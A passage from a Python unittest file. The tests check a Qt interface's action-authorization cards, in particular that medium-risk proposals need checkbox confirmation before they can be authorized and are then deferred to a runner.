        cards = self._authorize_buttons(QtWidgets, root)
        self.assertEqual(len(cards), 1)
        self.assertTrue(cards[0].isEnabled())
        cards[0].click()
        _pump(app)
        pending = state.action_registry.list_pending()
        self.assertEqual(pending, [])
        self.assertTrue(any("read-only" in message
                            for message in status.messages))

    def test_medium_risk_authorize_defers_to_runner(self):
        QtWidgets, app = _needs_qt(self)
        state = _state(self)
        status = self._status()
        root = self._build(QtWidgets, state, status)
        self._task_edit(QtWidgets, root).setPlainText(
            "Refactor the auth module")
        self._click(QtWidgets, root, "Propose action")
        _pump(app)
        cards = self._authorize_buttons(QtWidgets, root)
        self.assertEqual(len(cards), 1)
        self.assertFalse(cards[0].isEnabled())
        for check in root.findChildren(QtWidgets.QCheckBox):
            if check.objectName().startswith("proposal_check_"):
                check.setChecked(True)
        self.assertTrue(cards[0].isEnabled())
        cards[0].click()
        _pump(app)
        specs = [state.action_registry.get(entry.action_id)
                 for entry in state.action_registry.list_pending()]
        self.assertEqual(specs, [])
        self.assertTrue(any("deferred" in message
                            for message in status.messages))
